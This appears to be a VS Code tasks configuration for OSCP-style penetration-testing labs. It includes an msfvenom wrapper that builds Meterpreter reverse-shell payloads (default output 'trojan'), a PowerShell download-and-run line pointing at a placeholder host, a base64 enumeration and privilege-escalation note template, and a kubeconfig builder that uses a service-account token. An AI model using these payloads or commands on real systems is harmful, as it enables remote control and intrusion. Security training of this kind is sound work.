{
    "version": "2.0.0",
    "tasks": [
        {
            "label": "msfvenom payload creating",
            "type": "shell",
            "detail": "msfvenom payload creating task",
            "problemMatcher": [],
            "command": [
                "msfvenom",
                "-p",
                "${input:msfvenom-payload}",
                "LHOST=${input:msfvenom-lhost}",
                "LPORT=${input:msfvenom-lport}",
                "${input:msfvenom-payload-advanced-options}",
                "-o",
                "${input:msfvenom-output}",
                "-f",
                "${input:msfvenom-format}"
            ],
            "presentation": {
                "echo": true,
                "reveal": "always",
                "focus": false,
                "panel": "new",
                "showReuseMessage": false,
                "clear": true,
                "close": false
            },
            "runOptions": {
                "runOn": "default"
            },
            "isBackground": false,
            "promptOnClose": true,
            "hide": false
        },
        {
            "label": "venv create",
            "type": "shell",
            "detail": "venv create task",
            "command": [
                "${input:python-versioned} -m venv venv;",
                "echo '*' > venv/.gitignore;"
            ],
            "problemMatcher": []
        },
        {
            "label": "edit /etc/hosts",
            "type": "shell",
            "detail": "edit /etc/hosts task",
            "command": [
                "sudo",
                "vim",
                "/etc/hosts"
            ],
            "isBackground": false,
            "problemMatcher": []
        },
        {
            "label": "Encoder/Decoder",
            "command": [
                "${input:visit-cyberchef}"
            ],
            "problemMatcher": []
        },
        {
            "label": "OSCP exam style note template",
            "type": "shell",
            "detail": "OSCP exam style note template task, you can use this to create a note file for the exam or other lab.",
            "command": [
                "echo ${input:note-template-type}|base64 -d > ${input:note-filename}",
                "\n# fileSource: https://github.com/0prrr/OSCP-Note-Template",
            ],
            "problemMatcher": []
        },
        {
            "label": "service account token kubeconfig generation",
            "type": "shell",
            "detail": "Create service account based kubeconfig file",
            "command": [
                "echo 'This Task needs kubectl; make sure the kubeconfig is in your path';\n",
                "mv ~/.kube/config ~/.kube/config-back.vscode-gernerating ;\n",
                "kubectl config set-cluster localcfg --server=${input:kubeconfig-gen-api-server} --insecure-skip-tls-verify=true ;\n",
                "kubectl config set-credentials user --token ${input:kubeconfig-gen-sa-token} ;\n",
                "kubectl config set-context localcfg --cluster=localcfg --user=user --namespace=${input:kubeconfig-gen-namespace} ;\n",
                "cp ~/.kube/config ${workspaceFolder}/kubeconfig ;\n",
                "mv ~/.kube/config-back.vscode-gernerating ~/.kube/config ;\n",
                "echo ;\n",
                "echo export KUBECONFIG=${workspaceFolder}/kubeconfig ;\n",
                "cat ${workspaceFolder}/kubeconfig"
            ],
            "problemMatcher": []
        }
    ],
    "inputs": [
        // msfvenom
        {
            "id": "msfvenom-payload",
            "type": "pickString",
            "description": "Select the payload",
            "options": [
                // Order with the most used payloads first
                // Staged first, better stageless
                "windows/x64/meterpreter/reverse_tcp",
                "windows/meterpreter/reverse_tcp",
                "linux/x64/meterpreter/reverse_tcp",
                "linux/x86/meterpreter/reverse_tcp",
                "php/meterpreter/reverse_tcp",
                "python/meterpreter/reverse_tcp",
                "windows/meterpreter/reverse_http",
                "windows/x64/meterpreter/reverse_http",
                "windows/meterpreter/reverse_https",
                "windows/x64/meterpreter/reverse_https",
                "java/meterpreter/reverse_tcp",
            ]
        },
        {
            "id": "msfvenom-format",
            "type": "pickString",
            "description": "Select the format of the payload",
            "options": [
                // executable first, script second, web hta third
                // "# DONOT Choose this.(psh is powershell script with loader,raw is used for python java php pyloads)",
                "exe",
                "elf",
                "psh # psh is powershell payload with loader using `IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:80/<output>.ps1');` to load in memory ",
                "dll",
                "hta-psh",
                "psh-cmd",
                "psh-net",
                "psh-reflection",
                "elf-so",
                "exe-service",
                "raw # php python java meterpreter will meet error if you choose like php python",
                "raw | xxd -i # you can use this to get shellcode (but you need output in /dev/stdout)",
                "jsp",
                "jar",
                "war",
                "pl",
                "asp",
                "aspx",
                "msi",
                "python-reflection",
                "vba",
                "vba-exe",
                "vba-psh",
                "vbs",
            ]
        },
        {
            "id": "msfvenom-lhost",
            "type": "promptString",
            "description": "Enter the LHOST",
            "default": "10.10.",
        },
        {
            "id": "msfvenom-lport",
            "type": "promptString",
            "description": "Enter the LPORT",
            "default": "6789",
        },
        {
            "id": "msfvenom-payload-advanced-options",
            "type": "pickString",
            "description": "Enter the advanced options",
            "default": "",
            "options": [
                "",
                "PrependMigrate=true PrependMigrateProc=explorer.exe",
                "PrependFork=true",
                "PrependSetuid=true",
                "PrependSetuid=true PrependFork=true",
            ]
        },
        {
            "id": "msfvenom-output",
            "type": "promptString",
            "description": "Enter the output filename. if you put /dev/stdout here, the output will be printed to the terminal",
            "default": "${workspaceFolder}/trojan",
        },
        // note-templates
        {
            "id": "note-template-type",
            "type": "pickString",
            "description": "Select the note template type. First one is Linux, Second one is Windows",
            "options": [
                "IyBMaW51eCBUZW1wbGF0ZQoKIyBPdmVydmlldwoKLSBPUwogICAgCiAgICBgYGAKICAgICMgUmVzdWx0OgogICAgCiAgICBgYGAKICAgIAotIE92ZXJhbGwgVHlwZQogICAgLSAKICAgIAotIENyZWRzCiAgICAKICAgIGBgYAogICAgIyBSZXN1bHQ6CiAgICAKICAgIGBgYAogICAgCgojIFByb29mIEZpbGVzCgojIyBMb2NhbCBwcm9vZgoKYGBgCiMgUmVzdWx0OgoKYGBgCgpTY3JlZW5zaG90OgoKCgojIyBTeXN0ZW0gcHJvb2YKCmBgYAojIFJlc3VsdDoKCmBgYAoKU2NyZWVuc2hvdDoKCgojIEVudW1lcmF0aW9uCgp8IFBvcnRzIE9wZW4gfCAgfAp8IC0tLSB8IC0tLSB8CgojIyBGVFAgUG9ydCAyMQoKVHJ5IGRlZmF1bHQgY3JlZGVudGlhbHMuIGFub255bW91cz8gZ3Vlc3Q6Z3Vlc3Q/IGFkbWluOmFkbWluPyByb290OnJvb3Q/CgpCYW5uZXIKCmBgYAojIFJlc3VsdDoKCmBgYAoKTm1hcCBzY3JpcHQgc2NhbgoKYGBgCiMgUmVzdWx0OgoKYGBgCgpCcnV0ZSBmb3JjZQoKYGBgCmh5ZHJhIC1DIC91c3Ivc2hhcmUvc2VjbGlzdHMvUGFzc3dvcmRzL0RlZmF1bHQtQ3JlZGVudGlhbHMvZnRwLWJldHRlcmRlZmF1bHRwYXNzbGlzdC50eHQgZnRwIC12ViAtZgoKIyBSZXN1bHQ6CgpgYGAKCkNhbiB1cGxvYWQgZmlsZT8KCmBgYAojIFJlc3VsdDoKCmBgYAoKUHViaWMgdnVsbmVyYWJpbGl0eT8KCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMgU1NIIFBvcnQgMjIKCkJhbm5lci4gSXMgdGhlIHZlcnNpb24gdnVsbmVyYWJsZT8KCmBgYAojIFJlc3VsdDoKCmBgYAoKQWRkaXRpb25hbCBpbmZvIChzc2ggcm9vdEBpcCkKCmBgYAojIFJlc3VsdDoKCmBgYAoKVXNlciBuYW1lIGZvdW5kPyBUcnkgbWFjaGluZSBuYW1lPyB1c2VybmFtZTp1c2VybmFtZT8gdXNlcm5hbWU6aG9zdG5hbWU/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIFNNVFAgUG9ydCAyNQoKQmFubmVyCgpgYGAKIyBSZXN1bHQ6CgpgYGAKCk5tYXAgc2NyaXB0IHNjYW4KCmBgYAojIFJlc3VsdDoKCmBgYAoKR290IHVzZXJuYW1lcz8gVXNlcm5hbWUgZW51bT8KCmBgYAojIGdlbmVyYXRlIHVzZXJuYW1lcyBmaXJzdCB3aXRoIHVzZXJuYW1lci5weQoKIyBzbXRwLXVzZXItZW51bQoKIyBkb24ndCBmb3JnZXQgdXNlcm5hbWUgYXMgcGFzc3dvcmQKCiMgUmVzdWx0OgoKYGBgCgpQdWJsaWMgdnVsbmVyYWJpbGl0eT8KCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMgRE5TIChPcHRpb25hbCkKClN1YmRvbWFpbnM/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKClpvbmUgVHJhbnNmZXI/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIEhUVFAgUG9ydCA4MAoKIyMjIEhvbWUgUGFnZSAoQSBzY3JlZW5zaG90IHdpbGwgZG8pCgojIyMgTmVlZCBpbmZvIGZvciBicnV0ZSBmb3JjaW5nPyBET07igJlUIEZPUkdFVCBjZXdsISEhCgojIyMgVGhpcmQgUGFydHkgV2ViIEFwcD8gUHVibGljIFZ1bG5lcmFiaWxpdHk/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIyByb2JvdHMudHh0CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIyBkaXJiL2dvYnVzdGVyIChjb21tb24udHh0LCBkaXJidXN0ZXItbWVkaXVtLnR4dCkKCmBgYAojIFJlc3VsdDoKCmBgYAoKV2l0aCBkb21haW4gbmFtZT8gdmhvc3Q/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIyBCYWNrZW5kIFRlY2hzdGFjay93aGF0d2ViCgpgYGAKd2hhdHdlYiAtYSAzIGh0dHA6Ly9pcAoKIyBSZXN1bHQ6CgpgYGAKCiMjIyA0MDMKClNpbXBsZSBCeXBhc3M/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIyA0MDQKCkFueSBpbnRlcmVzdGluZyBpbmZvcm1hdGlvbj8KCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMjIGluZGV4Lmh0bWwvcGhwPyAoZ29idXN0ZXIgd2l0aCAteCkKCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMjIFNvdXJjZSBDb2RlCgpBbnl0aGluZyBpbnRlcmVzdGluZz8KCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMjIEJ1cnAgVHJhZmZpYwoKYGBgCiMgUmVzdWx0OgoKYGBgCgpDb21tYW5kIGluamVjdGlvbj8gQ2hhbmdlIHJlcXVlc3QgbWV0aG9kPwoKYGBgCiMgUmVzdWx0OgoKYGBgCgojIyMgbmlrdG8KCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMjIEFwYWNoZT8gY2dpLWJpbj8KCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMjIENoZWNrIENvb2tpZXMKCkFueXRoaW5nIGludGVyZXN0aW5nPyBCYXNlNjQ/IEpXVD8KCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMjIFVzZXIgSW5wdXQgRmllbGRzPyBTUUxpPwoKYGBgCiMgUmVzdWx0OgoKYGBgCgpDYW4geW91IGxvY2sgdGhlIGFjY291bnQgb3V0PwoKYGBgCiMgUmVzdWx0OgoKYGBgCgojIyMgcGhwaW5mbygpPwoKU2VydmVyIGRvY3VtZW50IHJvb3QKCmBgYAojIFJlc3VsdDoKCmBgYAoKdXJsIG9wZW4gc2V0dGluZ3MKCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMjIExGST9SRkk/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIyBVc2VycyBmb3VuZD8gU1NIIG9wZW4/IEJydXRlIGZvcmNlPwoKYGBgCiMgUmVzdWx0OgoKYGBgCgojIyBJZGVudCBQb3J0IDExMwoKSWRlbnRpZnkgdXNlcm5hbWUKCmBgYAppZGVudC11c2VyLWVudW0gPHRhcmdldC1pcD4gPHBvcnQtbGlzdD4KCiMgUmVzdWx0OgoKYGBgCgojIyBTTUIgUG9ydCAxMzksIDQ0NQoKTnVsbCBzZXNzaW9uPwoKYGBgCiMgUmVzdWx0OgoKYGBgCgpDYW4gbGlzdCBzaGFyZXM/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCk5tYXAgc2NyaXB0IHNjYW46CgpgYGAKIyBSZXN1bHQ6CgpgYGAKClZlcnNpb24gPCAyLjIuOD8gQ2Fubm90IGdldCB2ZXJzaW9uPyBUcnkgd2lyZXNoYXJrPyBbaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTBdKGh0dHBzOi8vd3d3LmV4cGxvaXQtZGIuY29tL2V4cGxvaXRzLzEwKQoKYGBgCiMgUmVzdWx0OgoKYGBgCgplbnVtNGxpbnV4CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCkFub255bW91cyBsb2dpbj8KCmBgYAojIFJlc3VsdDoKCmBgYAoKRmlsZXMKCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMgTXlTUUwgUG9ydCAzMzA2CgpCYW5uZXIKCmBgYAojIFJlc3VsdDoKCmBgYAoKTm1hcCBzY3JpcHQgc2NhbgoKYGBgCiMgUmVzdWx0OgoKYGBgCgpEZWZhdWx0IGNyZWRlbnRpYWw6CgpgYGAKcm9vdDooZW1wdHkpCnJvb3Q6cm9vdAoKIyBSZXN1bHQ6CgpgYGAKCkJydXRlIGZvcmNlPz8/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIFBvc3RncmVzcWwgUG9ydCA1NDMyCgpEZWZhdWx0IGNyZWRlbnRpYWw6CgpgYGAKcG9zdGdyZXM6cG9zdGdyZXMKcG9zdGdyZXM6KGVtcHR5KQoKIyBSZXN1bHQ6CmBgYAoKCiMgUHJpdmlsZWdlIEVzY2FsYXRpb24KCiMjIHdob2FtaQoKYGBgCiMgUmVzdWx0OgoKYGBgCgojIyBpZAoKYGBgCiMgUmVzdWx0OgoKYGBgCgojIyBob3N0bmFtZQoKYGBgCiMgUmVzdWx0OgoKYGBgCgojIyB1bmFtZSAtYQoKYGBgCiMgUmVzdWx0OgoKYGBgCgoKIyMgL2V0Yy9wYXNzd2QKCmBgYApncmVwIC12RSAibm9sb2dpbnxmYWxzZSIgL2V0Yy9wYXNzd2Q7bHMgLWFsIC9ldGMvcGFzc3dkCgojIFJlc3VsdDoKCmBgYAoKVXNlcnMgb24gdGFyZ2V0CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCi9ldGMvcGFzc3dkIGZpbGUgcGVybWlzc2lvbgoKYGBgCiMgUmVzdWx0OgoKYGBgCgojIyAvZXRjL3NoYWRvdwoKL2V0Yy9zaGFkb3cgZmlsZSBwZXJtaXNzaW9uCgpgYGAKbHMgLWFsIC9ldGMvc2hhZG93CgojIFJlc3VsdDoKCmBgYAoKIyMgY2F0IC9ldGMvKi1yZWxlYXNlCgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIyBTU0ggbW90ZCBpbmZvCgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIGVudgoKYGBgCiMgUmVzdWx0OgoKYGBgCgojIyBzdWRvIHZlcnNpb24KCmBgYApzdWRvIC1WCgojIFJlc3VsdDoKYGBgCgojIyBzdWRvIC1sCgpgYGAKc3VkbyAtbAoKIyBSZXN1bHQ6CgpgYGAKCiMjIENyb250YWIKCkFueSBpbnRlcmVzdGluZyBQQVRIPwoKYGBgCmNhdCAvZXRjL2Nyb24qCgojIFJlc3VsdDoKCmBgYAoKIyMgUHJvY2Vzc2VzCgpgYGAKcHMgYXV4IHwgZ3JlcCByb290CgojIFJlc3VsdDoKCmBgYAoKIyMgZnN0YWIKCmBgYApjYXQgL2V0Yy9mc3RhYgoKIyBSZXN1bHQ6CgpgYGAKCiMjIFNVSUQKCmBgYApmaW5kIC8gLXBlcm0gLTA0MDAwIC10eXBlIGYgMj4vZGV2L251bGwKCiMgUmVzdWx0OgoKYGBgCgojIyBDYXBhYmlsaXR5CgpgYGAKZ2V0Y2FwIC1yIC8gMj4vZGV2L251bGwKCiMgUmVzdWx0OgoKYGBgCgoKCiMjIG5ldHN0YXQvc3MKCkNvbW1hbmQKCmBgYApuZXRzdGF0IC1hbnRscApzcyAtYW50bHAKCiMgUmVzdWx0OgoKYGBgCgojIyBXcml0YWJsZSBGaWxlcyAoZ3JlcCAtdiBmb3IgZmlsdGVyaW5nKQoKQ29tbWFuZAoKYGBgCmZpbmQgLyAtd3JpdGFibGUgLXR5cGUgZiAyPi9kZXYvbnVsbAoKIyBSZXN1bHQ6CgpgYGAKCiMjIFdyaXRhYmxlIERpcnMgKGdyZXAgLXYgZm9yIGZpbHRlcmluZykKCmBgYApmaW5kIC8gLXdyaXRhYmxlIC10eXBlIGQgMj4vZGV2L251bGwKCiMgUmVzdWx0OgoKYGBgCgoKIyMgSG9tZSBEaXIgRmlsZXMKCiMjIyBTaGVsbCBTY3JpcHQ/IFB5dGhvbj8gQW55IFNvdXJjZSBDb2RlIFdvcnRoIFJlYWRpbmc/CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCiMjIyBiYXNoX2hpc3RvcnkKCmBgYApjYXQgfi8uYmFzaF9oaXN0cm95CgojIFJlc3VsdDoKCmBgYAoKIyMjIC5zc2gKCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMjIFdlYiBzZXJ2ZXIgbG9nIGZpbGVzPyBUcmFmZmljIGNvbWUgZnJvbT8KCmBgYAojIFJlc3VsdDoKCmBgYAoKIyMgTGluUEVBcwoKYGBgCiMgUmVzdWx0OgoKYGBgCgojIyBQc3B5CgpgYGAKIyBSZXN1bHQ6CgpgYGAKCjxiciAvPgo8YnIgLz4K",
                ""
            ]
        },
        {
            "id": "note-filename",
            "type": "promptString",
            "description": "Enter the note filename",
            "default": "${workspaceFolder}/note.md",
        },
        // cyberchef url
        {
            "id": "visit-cyberchef",
            "type": "command",
            "command": "simpleBrowser.show",
            "args": [
                "https://gchq.github.io/CyberChef/"
            ]
        },
        // kubeconfig creator
        {
            "id": "kubeconfig-gen-api-server",
            "type": "promptString",
            "description": "kubernetes api server",
            "default": "https://server-ip:6443",
        },
        {
            "id": "kubeconfig-gen-sa-token",
            "type": "promptString",
            "description": "kubernetes service account token under /var/run/secrets/kubernetes.io/serviceaccount/token",
        },
        {
            "id": "kubeconfig-gen-namespace",
            "type": "promptString",
            "description": "kubernetes service account namespace",
            "default": "default"
        },
        // python version picker
        {
            "id": "python-versioned",
            "type": "pickString",
            "description": "Python version",
            "options": [
                "python3.8",
                "python3.9",
                "python3.10",
                "python3.11",
                "python3.12",
                "python",
            ],
            "default": "python"
        }
    ]
}